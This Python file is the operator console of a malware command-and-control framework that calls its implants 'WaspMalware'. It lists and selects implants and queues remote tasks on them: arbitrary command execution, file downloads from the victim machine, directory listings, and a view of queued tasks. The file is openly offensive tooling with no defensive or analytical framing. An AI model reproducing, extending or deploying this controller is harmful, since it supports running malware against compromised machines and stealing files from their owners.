#!/usr/bin/env python3
from __future__ import annotations
import argparse
from ctypes import ArgumentError
from logging import Logger

from typing import List, Optional

from pathlib import Path

from constants import WASP_HOME, WASPS_PATH
from wasp_types import WaspMalware, WaspCommand, WaspResponse, logger, WaspException
from wasp_commands import WaspCommandDownload, WaspCommandExecute, WaspCommandFileList

class WaspUI(object):
    selected_wasp: Optional[WaspMalware] = None
    logger: Logger = logger.getChild("WaspUI")

    @property
    def wasps(self) -> List[WaspMalware]:
        wasps: List[WaspMalware] = []
        for wasp_dir in WASPS_PATH.iterdir():
            wasp_id = wasp_dir.name
            metadata_path = wasp_dir / "wasp.json"
            metadata = metadata_path.read_bytes()
            wasp = WaspMalware.unpack(metadata)
            self.logger.debug(f"Loaded wasp: {wasp}")
            wasps.append(wasp)
        return wasps

    def select_wasp(self, to_select: WaspMalware | str):
        if isinstance(to_select, str):
            found = False
            for wasp in self.wasps:
                if wasp.wasp_id == to_select:
                    to_select = wasp
                    found = True
                    break
            if not found:
                raise WaspException(f"Cannot find Wasp with ID: {to_select}")

        self.selected_wasp = to_select
        self.logger.info(f"Active Wasp: {self.selected_wasp}")

    def submit_command(self, command: WaspCommand):
        if self.selected_wasp:
            self.selected_wasp.submit_task(command)
        else:
            raise WaspException("No Wasp selected!")

if __name__ == '__main__':
    import shlex
    import prompt_toolkit
    from prompt_toolkit import PromptSession

    session = PromptSession()

    parser = argparse.ArgumentParser("WASP UI", exit_on_error=False)

    subparser = parser.add_subparsers(dest="wasp_command")

    list_parser = subparser.add_parser("list", help="List known Wasps", exit_on_error=False)

    select_parser = subparser.add_parser("select", help="Select the Wasp to operate on", exit_on_error=False)
    select_parser.add_argument('WASP_ID', type=str, help='The Wasp identifier of the Wasp you wish to operate on. See "list"')

    command_parser = subparser.add_parser("command", aliases=["exec", "run"], help="Run a command on the given Wasp", exit_on_error=False)
    command_parser.add_argument('COMMAND', type=str, help='The command to run. Prefix with -- to avoid shell interpretation')

    download_parser = subparser.add_parser("download", help="Download a file from the Wasp")
    download_parser.add_argument("PATH", type=Path, help="The path the file to download from Wasp")
   
    file_list_parser = subparser.add_parser("ls", aliases=["directory-list", "dir"], help="List a directory on the Wasp", exit_on_error=False)
    file_list_parser.add_argument("PATH", type=Path, help="The path to list on the Wasp")

    queue_parser = subparser.add_parser("queue", help="Display the currently queued commands for this Wasp", exit_on_error=False)

    # TODO: Implement "vim"
    # Download file locally
    # Pop editor
    # If changed, push

    def _explode(*x, **y):
        raise WaspException()

    for p in [
        parser,
        list_parser,
        select_parser,
        command_parser,
        download_parser,
    ]:
        p.exit = _explode

    ui = WaspUI()

    while True:
        try:
            command = session.prompt("🐝 > ")
            args = parser.parse_args(shlex.split(command))

            match args.wasp_command:
                case "list":
                    for wasp in ui.wasps:
                        print(wasp)
                case 'select':
                    wasp_id = args.WASP_ID
                    ui.select_wasp(wasp_id)
                case 'command':
                    command = args.COMMAND
                    if ui.selected_wasp:
                        task = WaspCommandExecute(ui.selected_wasp, command)
                        ui.submit_command(task)
                case 'download':
                    # TODO: Implement other arguments
                    path = args.PATH
                    if ui.selected_wasp:
                        task = WaspCommandDownload(ui.selected_wasp, path)
                        ui.submit_command(task)
                case 'ls':
                    path = args.PATH
                    if ui.selected_wasp:
                        task = WaspCommandFileList(ui.selected_wasp, path)
                        ui.submit_command(task)
                case 'queue':
                    if ui.selected_wasp:
                        for command in ui.selected_wasp.get_tasks():
                            print(command)
                case _:
                    raise WaspException("Unimplemented Command")
        except argparse.ArgumentError:
            parser.print_help()
        except WaspException:
            parser.print_help()
